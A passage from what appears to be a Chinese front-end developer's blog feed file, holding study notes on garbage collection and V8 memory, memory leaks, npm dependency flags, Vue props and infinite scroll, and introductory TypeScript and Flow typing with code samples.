class="string">'name'</span>, <span class="comment">// 命令行需要输入的</span></span><br><span class="line">          message: <span class="string">'Your project name'</span>,</span><br><span class="line">          <span class="keyword">default</span>: <span class="keyword">this</span>.appname</span><br><span class="line">        &#125;</span><br><span class="line">      ])</span><br><span class="line">      .then(<span class="function"><span class="params">answers</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.answers = answers</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    writing () &#123;</span><br><span class="line">        <span class="keyword">const</span> templates = [</span><br><span class="line">            <span class="string">'a.js'</span>,</span><br><span class="line">            <span class="string">'src/main.js'</span>,</span><br><span class="line">            <span class="comment">//...需要的文件</span></span><br><span class="line">        ]</span><br><span class="line">        templates.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.fs.copyTpl(</span><br><span class="line">                <span class="keyword">this</span>.templatePath(item),</span><br><span class="line">                <span class="keyword">this</span>.destinationPath(item),</span><br><span class="line">                <span class="keyword">this</span>.answers</span><br><span class="line">            )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GC算法，V8引擎</title>
      <link href="2020/08/26/%E6%95%B4%E7%90%86-GC%E7%AE%97%E6%B3%95%EF%BC%8CV8%E5%BC%95%E6%93%8E/"/>
      <url>2020/08/26/%E6%95%B4%E7%90%86-GC%E7%AE%97%E6%B3%95%EF%BC%8CV8%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<ul><li>GC算法</li><li>内存泄露</li><li>V8引擎</li><li>performance</li></ul><a id="more"></a><h2 id="GC算法"><a href="#GC算法" class="headerlink" title="GC算法"></a>GC算法</h2><h5 id="1-标记清除"><a href="#1-标记清除" class="headerlink" title="1. 标记清除"></a>1. 标记清除</h5><p>垃圾回收器会在运行时给存储在内存中的所有变量加一个标记，然后去除环境中的变量以及被环境中的变量所引用的变量（闭包）在这些完成后仍存在标记的就是要删除的变量了，因为环境中的变量已经无法访问到这些变量了。缺点是清除的对象可能地址不连续，造成内存碎片化。</p><p>优缺点：1. 可处理循环引用 2. 产生碎片化 3. 不会立即回收</p><h5 id="2-引用计数"><a href="#2-引用计数" class="headerlink" title="2. 引用计数"></a>2. 引用计数</h5><p>引用计数的策略是跟踪记录每个值被使用的次数。当声明了一个变量并将一个引用类型赋值给该变量时，这个值得引用次数就加一，如果该变量的值变成了另一个，则这个值得引用次数就减一，当这个值的引用次数为0的时候，说明没有变量在使用，这个值无法访问。由此可以将其占用的空间回收，这些垃圾回收器就会在运行时清理掉引用次数为0的值占用的空间，但这种方法容易引起内存泄漏，因为这种方式没有解决循环引用的问题，所以不建议使用！例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123; a:1,b:2,c:3 &#125;;</span><br><span class="line">obj.o = obj;//循环引用</span><br></pre></td></tr></table></figure><p>优缺点：1.即时回收 2. 减少程序卡顿 3.无法解决循环引用 4. 资源消耗大：维护引用计数器</p><h5 id="3-标记整理"><a href="#3-标记整理" class="headerlink" title="3. 标记整理"></a>3. 标记整理</h5><p>标记清除的升级版，清除之前先整理空间，再清除，防止内存碎片化</p><h2 id="什么情况会引起内存泄漏？"><a href="#什么情况会引起内存泄漏？" class="headerlink" title="什么情况会引起内存泄漏？"></a>什么情况会引起内存泄漏？</h2><p>虽然有垃圾回收机制但是我们编写代码操作不当还是会造成内存泄漏。</p><ul><li>意外的全局变量引起的内存泄漏。</li></ul><p>原因：全局变量，不会被回收。</p><p>解决：使用严格模式避免。</p><ul><li>闭包引起的内存泄漏</li></ul><p>原因：闭包可以维持函数内局部变量，使其得不到释放。</p><p>解决：将事件处理函数定义在外部，解除闭包,或者在定义事件处理函数的外部函数中，删除对dom的引用。</p><ul><li>没有清理的DOM元素引用</li></ul><p>原因：虽然别的地方删除了，但是对象中还存在对dom的引用</p><p>解决：手动删除。</p><ul><li>被遗忘的定时器或者回调</li></ul><p>原因：定时器中有dom的引用，即使dom删除了，但是定时器还在，所以内存中还是有这个dom。</p><p>解决：手动删除定时器和dom。</p><ul><li>子元素存在引用引起的内存泄漏</li></ul><p>原因：div中的ul li  得到这个div，会间接引用某个得到的li，那么此时因为div间接引用li，即使li被清空，也还是在内存中，并且只要li不被删除，他的父元素都不会被删除。</p><p>解决：手动删除清空。</p><h2 id="V8引擎与垃圾回收策略"><a href="#V8引擎与垃圾回收策略" class="headerlink" title="V8引擎与垃圾回收策略"></a>V8引擎与垃圾回收策略</h2><ul><li>V8采用即时编译</li><li><p>V8内存设限（64操作系统不超过1.5G）</p></li><li><p>采用分代回收的思想</p></li><li>内存分为新生代，老生代</li><li>不同对象采用不同GC算法</li></ul><h3 id="V8内存分配与垃圾回收"><a href="#V8内存分配与垃圾回收" class="headerlink" title="V8内存分配与垃圾回收"></a>V8内存分配与垃圾回收</h3><blockquote><p>V8内存空间一分为二</p><p>小空间用于存储新生代对象（32M | 16M）</p><p>新生代指的是存活时间较短的对象</p><p>新生代内存区分为两个相等空间</p><p>使用空间为From，空闲空间为To</p><p>活动对象存储于From空间</p><p>进行回收时，标记整理将From活动对象拷贝至To，释放From区域</p><p>最后From和To交换空间</p><p>空间换时间</p></blockquote><p>回收过程中可能出现晋升：</p><ul><li>一轮GC还存活的新生代需要晋升到老年代</li><li>To空间使用率超过25%的需要晋升，因为From和To互换后需要保证新活动对象的空间充足</li></ul><blockquote><p>老生代（1.4G | 700M）</p><p>老生代对象就是指存活时间较长的对象</p><p>采用标记清除，标记整理，增量标记</p><p>首先使用标记清除完成垃圾回收</p><p>采用标记整理进行空间优化</p><p>采用增量标记进行效率优化，将标记过程分段，与程序执行交替执行，提高效率（垃圾回收会阻塞程序）</p></blockquote><h2 id="performance"><a href="#performance" class="headerlink" title="performance"></a>performance</h2><p>打开F12中的performance工具，点击录制，输入网址并做一些操作，点击停止就可以看到最后一个图的蓝色线条即是内存变换情况。</p><p><strong>监控内存的方式</strong></p><ul><li>浏览器任务管理器：<code>shift+esc，</code>最后一列可看到JavaScript使用的内存</li><li>Timeline时序图：蓝色线条，在其上面可定位</li><li>堆快照查找分离DOM：F12中的Memory选项，Take snapshot</li><li>判断是否存在频繁的垃圾回收：Timeline和任务管理器去查看</li></ul>]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-8.25</title>
      <link href="2020/08/25/%E6%97%A5%E5%B8%B8-2020.8.25/"/>
      <url>2020/08/25/%E6%97%A5%E5%B8%B8-2020.8.25/</url>
      
        <content type="html"><![CDATA[<ul><li>npm中的 –save与–save-dev</li><li>文件目录结构</li><li>vue-infinite-scroll</li><li>一种flex布局</li><li>props的写法</li><li>使用Array.includes来处理多个条件</li></ul><a id="more"></a><h2 id="npm中的-–save与–save-dev"><a href="#npm中的-–save与–save-dev" class="headerlink" title="npm中的 –save与–save-dev"></a>npm中的 –save与–save-dev</h2><ul><li><strong>i</strong> 是 <strong>install</strong> 的简写</li><li><strong>-g</strong> 是全局安装，不带 <strong>-g</strong> 会安装在个人文件夹</li><li><strong>-S</strong> 与 <strong>–save</strong> 的简写，安装包信息会写入 <strong>dependencies</strong> 中</li><li><p><strong>-D</strong> 与 <strong>–save-dev</strong> 的简写，安装包写入 <strong>devDependencies</strong> 中</p></li><li><p><strong>dependencies</strong> 生产阶段的依赖,也就是项目运行时的依赖</p></li><li><strong>devDependencies</strong> 开发阶段的依赖，就是我们在开发过程中需要的依赖，只在开发阶段起作用的</li></ul><hr><p>比如写 <code>ES6</code> 代码，需要 <code>babel</code> 转换成 <code>es5</code> ，转换完成后，我们只需要转换后的代码，上线的时候，直接把转换后的代码部署到生产环境，不需要 <code>bebal</code> 了，生产环境不需要。这就可以安装到 <strong>devDependencies</strong> ，再比如说代码提示工具，也可以安装到 <strong>devDependencies</strong> 。</p><p>如果你用了 <code>Element-UI</code>，由于发布到生产后还是依赖 <code>Element-UI</code>，这就可以安装到 <strong>dependencies</strong> 。</p><h2 id="如何生成一个文件目录结构"><a href="#如何生成一个文件目录结构" class="headerlink" title="如何生成一个文件目录结构"></a>如何生成一个文件目录结构</h2><ul><li>先全局安装<code>tree</code>：<code>cnpm i tree-node-cli -g</code></li><li>cd到需要生成目录的文件夹下输入：<code>tree -L 4 -I &quot;node_modules&quot; &gt; README.md</code></li></ul><p>-L 是确定要几级目录，-I是排除哪个文件夹下的，然后我是要在README里面生成项目结构树 </p><h2 id="vue-infinite-scroll无限滚动"><a href="#vue-infinite-scroll无限滚动" class="headerlink" title="vue-infinite-scroll无限滚动"></a>vue-infinite-scroll无限滚动</h2><p>Use v-infinite-scroll to enable the infinite scroll, and use infinite-scroll-* attributes to define its options.</p><p>The method appointed as the value of v-infinite-scroll will be executed when the bottom of the element reaches the bottom of the viewport.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-infinite-scroll</span>=<span class="string">"loadMore"</span> <span class="attr">infinite-scroll-disabled</span>=<span class="string">"busy"</span> <span class="attr">infinite-scroll-distance</span>=<span class="string">"10"</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    data: [],</span><br><span class="line">    busy: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    loadMore: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.busy = <span class="literal">true</span>; <span class="comment">// 等于true时代表正在执行加载，这时禁用滚动触发。</span></span><br><span class="line"></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = <span class="number">10</span>; i &lt; j; i++) &#123;</span><br><span class="line">          <span class="keyword">this</span>.data.push(&#123; <span class="attr">name</span>: count++ &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.busy = <span class="literal">false</span>;</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>infinite-scroll-disabled</td><td>等于true时代表正在执行加载，这时禁用滚动触发。</td></tr><tr><td>infinite-scroll-distance</td><td>指定滚动条距离底部多高时触发v-infinite-scroll指向的方法。</td></tr><tr><td>infinite-scroll-immediate-check</td><td>布尔值(默认值= true)。指令在绑定后立即检查，是否内容高度不足以填充页面容器。</td></tr><tr><td>infinite-scroll-listen-for-event</td><td>当vue实例触发事件时立即再次检查。</td></tr><tr><td>infinite-scroll-throttle-delay</td><td>两次检查之间的时间间隔(默认值= 200)。</td></tr></tbody></table><h2 id="一种flex布局"><a href="#一种flex布局" class="headerlink" title="一种flex布局"></a>一种flex布局</h2><p><strong>效果是固定宽度，元素均匀分布，垂直居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"> <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">350px</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="props的写法"><a href="#props的写法" class="headerlink" title="props的写法"></a>props的写法</h2><ul><li><p>props 可以是数组或对象，用于接收来自父组件的数据。props 可以是简单的数组，或者使用对象作为替代，对象允许配置高级选项，如类型检测、自定义验证和设置默认值。</p><p>你可以基于对象的语法使用以下选项：</p><ul><li><code>type</code>：可以是下列原生构造函数中的一种：<code>String</code>、<code>Number</code>、<code>Boolean</code>、<code>Array</code>、<code>Object</code>、<code>Date</code>、<code>Function</code>、<code>Symbol</code>、任何自定义构造函数、或上述内容组成的数组。会检查一个 prop 是否是给定的类型，否则抛出警告。</li><li><code>default</code>：<code>any</code><br>为该 prop 指定一个默认值。如果该 prop 没有被传入，则换做用这个值。对象或数组的默认值必须从一个工厂函数返回。</li><li><code>required</code>：<code>Boolean</code><br>定义该 prop 是否是必填项。在非生产环境中，如果这个值为 truthy 且该 prop 没有被传入的，则一个控制台警告将会被抛出。</li><li><code>validator</code>：<code>Function</code><br>自定义验证函数会将该 prop 的值作为唯一的参数代入。在非生产环境下，如果该函数返回一个 false 的值 (也就是验证失败)，一个控制台警告将会被抛出。你可以在<a href="https://cn.vuejs.org/v2/guide/components-props.html#Prop-验证" target="_blank" rel="noopener">这里</a>查阅更多 prop 验证的相关信息。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">        detail: &#123;</span><br><span class="line">            type: <span class="built_in">Object</span>,</span><br><span class="line">            <span class="keyword">default</span>: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;,</span><br><span class="line">            required: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        age: &#123;</span><br><span class="line">          type: <span class="built_in">Number</span>,</span><br><span class="line">          <span class="keyword">default</span>: <span class="number">0</span>,</span><br><span class="line">          required: <span class="literal">true</span>,</span><br><span class="line">          validator: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value &gt;= <span class="number">0</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件向父组件传值时，一个事件可以传递多个参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件点击事件</span></span><br><span class="line">click(params1, params2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.$emit(<span class="string">'selectDay'</span>, params1, params2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父组件获取值</span></span><br><span class="line"><span class="comment">// &lt;child  @selectDay="fun"&gt;&lt;/child&gt;</span></span><br><span class="line">fun (params1, params2) &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(params1, params2) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Array-includes来处理多个条件"><a href="#使用Array-includes来处理多个条件" class="headerlink" title="使用Array.includes来处理多个条件"></a>使用Array.includes来处理多个条件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">fruit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fruit == <span class="string">'apple'</span> || fruit == <span class="string">'banana'</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(red)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果有更多的红色水果怎么办</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">fruit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> redFruits = [<span class="string">'apple'</span>, <span class="string">'strawberry'</span>, <span class="string">'cherry'</span>]</span><br><span class="line">    <span class="keyword">if</span> (redFruits.includes(fruit)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(red)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript</title>
      <link href="2020/08/23/%E6%95%B4%E7%90%86-TypeScript/"/>
      <url>2020/08/23/%E6%95%B4%E7%90%86-TypeScript/</url>
      
        <content type="html"><![CDATA[<ul><li>强类型和弱类型（类型安全）</li><li>静态类型与动态类型（类型检查）</li><li>Flow：JS类型检查器</li><li>TypeScript快速上手</li><li>TypeScript原始类型</li><li>Object类型，数组类型等</li><li>TypeScript接口与类</li><li>泛型</li></ul><a id="more"></a><p>学习网址：<a href="https://jkchao.github.io/typescript-book-chinese/" target="_blank" rel="noopener">https://jkchao.github.io/typescript-book-chinese/</a> </p><h2 id="强类型和弱类型"><a href="#强类型和弱类型" class="headerlink" title="强类型和弱类型"></a>强类型和弱类型</h2><p>比如说强类型语言要求实参和形参必须类型一致，弱类型则不会要求</p><p>强类型：不允许随意的隐式类型转换</p><p>弱类型：允许隐式类型转换</p><h2 id="静态类型和动态类型"><a href="#静态类型和动态类型" class="headerlink" title="静态类型和动态类型"></a>静态类型和动态类型</h2><p>静态类型：声明过后，它的类型就不允许再修改</p><p>动态类型：变量的类型可以随时改变</p><blockquote><p>基于以上，所有编程语言分为四类，JS即是弱类型也是动态类型</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line">obj.foo()  <span class="comment">//这样写没问题，只有等到运行时才会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果加了一个时间</span></span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    obj.foo()</span><br><span class="line">&#125;,<span class="number">10000</span>)  <span class="comment">// 错误就会保留在代码中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 又或者</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sun(<span class="number">100</span>, <span class="string">'100'</span>)) <span class="comment">//100100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还有对象键会自动转化成字符串</span></span><br><span class="line">obj[<span class="literal">true</span>] = <span class="number">100</span></span><br><span class="line"><span class="built_in">console</span>.log(obj[<span class="string">'true'</span>])</span><br></pre></td></tr></table></figure><h3 id="强类型的优势"><a href="#强类型的优势" class="headerlink" title="强类型的优势"></a>强类型的优势</h3><ol><li>错误更早暴露</li><li>代码更智能，编码更准确</li><li>重构更牢靠</li><li>减少不必要的类型判断</li></ol><h2 id="Flow：JS类型检查器"><a href="#Flow：JS类型检查器" class="headerlink" title="Flow：JS类型检查器"></a>Flow：JS类型检查器</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类型注解</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">a: number, b:number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怎么使用？首先<code>yarn add flow-bin</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @flow</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">a: number, b: number</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sum(<span class="string">'100'</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令行运行 yarn flow </span></span><br><span class="line"><span class="comment">// 报错:Could not find a .flowconfig in . or any of its parent directories.</span></span><br><span class="line"><span class="comment">// 运行yarn flow init</span></span><br><span class="line"><span class="comment">// yarn flow stop 停止运行</span></span><br></pre></td></tr></table></figure><p>学会Flow在读源码时很方便</p><p>1）函数的类型注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: number, y: number</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y      <span class="comment">//x的类型是number,y的类型是number，函数的返回值类型是number</span></span><br><span class="line">&#125;</span><br><span class="line">add(<span class="string">'Hello'</span>, <span class="number">11</span>)</span><br></pre></td></tr></table></figure><p> 2）数组类型注释：Array<t>,T表示数组中每项的数据类型</t></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr.push(<span class="string">'Hello'</span>)</span><br></pre></td></tr></table></figure><p>3）类类型注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">  x: string;           <span class="comment">// x 是字符串</span></span><br><span class="line">  y: string | number;  <span class="comment">// y 可以是字符串或者数字</span></span><br><span class="line">  z: boolean;</span><br><span class="line">  <span class="keyword">constructor</span>(x: string, y: string | number) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x</span><br><span class="line">    <span class="keyword">this</span>.y = y</span><br><span class="line">    <span class="keyword">this</span>.z = <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar: Bar = <span class="keyword">new</span> Bar(<span class="string">'hello'</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>4）对象类型注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj: &#123; <span class="attr">a</span>: string, <span class="attr">b</span>: number, <span class="attr">c</span>: <span class="built_in">Array</span>&lt;string&gt;, <span class="attr">d</span>: Bar &#125; = &#123;</span><br><span class="line">  a: <span class="string">'hello'</span>,</span><br><span class="line">  b: <span class="number">11</span>,</span><br><span class="line">  c: [<span class="string">'hello'</span>, <span class="string">'world'</span>],</span><br><span class="line">  d: <span class="keyword">new</span> Bar(<span class="string">'hello'</span>, <span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5）如果想指定类型为null或者undefined，只需要写成?T形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo: ?string = <span class="literal">null</span>   <span class="comment">//foo可以为字符串也可以为bull</span></span><br></pre></td></tr></table></figure><h2 id="TypeScript快速上手"><a href="#TypeScript快速上手" class="headerlink" title="TypeScript快速上手"></a>TypeScript快速上手</h2><p><code>yarn init</code>：初始化package.json</p><p><code>yarn add typescript --dev</code>：安装typescript</p><p>新建ts文件<code>demo.ts</code></p><p><code>yarn tsc demo.ts</code>：编译demo.ts</p><p>根目录下出现<code>demo.js</code>，已经自动转化为ES5</p><h3 id="TypeScript配置文件"><a href="#TypeScript配置文件" class="headerlink" title="TypeScript配置文件"></a>TypeScript配置文件</h3><p><code>yarn tsc --init</code>：生成<code>tsconfig.json</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"sourceMap": true,                     </span><br><span class="line"> // "outFile": "./",                      </span><br><span class="line"> "outDir": "dist",                        </span><br><span class="line"> "rootDir": "src",</span><br></pre></td></tr></table></figure><p>创建<code>src</code>文件夹放ts文件，运行<code>yarn tsc</code>编译整个项目</p><h2 id="TypeScript原始类型"><a href="#TypeScript原始类型" class="headerlink" title="TypeScript原始类型"></a>TypeScript原始类型</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a: <span class="built_in">string</span> = <span class="string">'a'</span></span><br><span class="line"><span class="keyword">const</span> b: <span class="built_in">number</span> = <span class="number">100</span> <span class="comment">// NaN Infinity</span></span><br><span class="line"><span class="keyword">const</span> c: <span class="built_in">boolean</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 非严格模式下可以设置为空</span></span><br><span class="line"><span class="keyword">const</span> d: <span class="built_in">string</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> e: <span class="built_in">void</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">const</span> f: <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"><span class="keyword">const</span> g: <span class="literal">undefined</span> = <span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> h: symbol = Symbol() <span class="comment">// 会报错，tsconfig.json中target设置成es2015就可以（引用的标准库）</span></span><br></pre></td></tr></table></figure><p>在写demo时，每个ts文件最后都加上一行<code>export {}</code>，使其成为模块作用域，保证变量名重复不报错</p><h2 id="Object类型，数组类型等"><a href="#Object类型，数组类型等" class="headerlink" title="Object类型，数组类型等"></a>Object类型，数组类型等</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 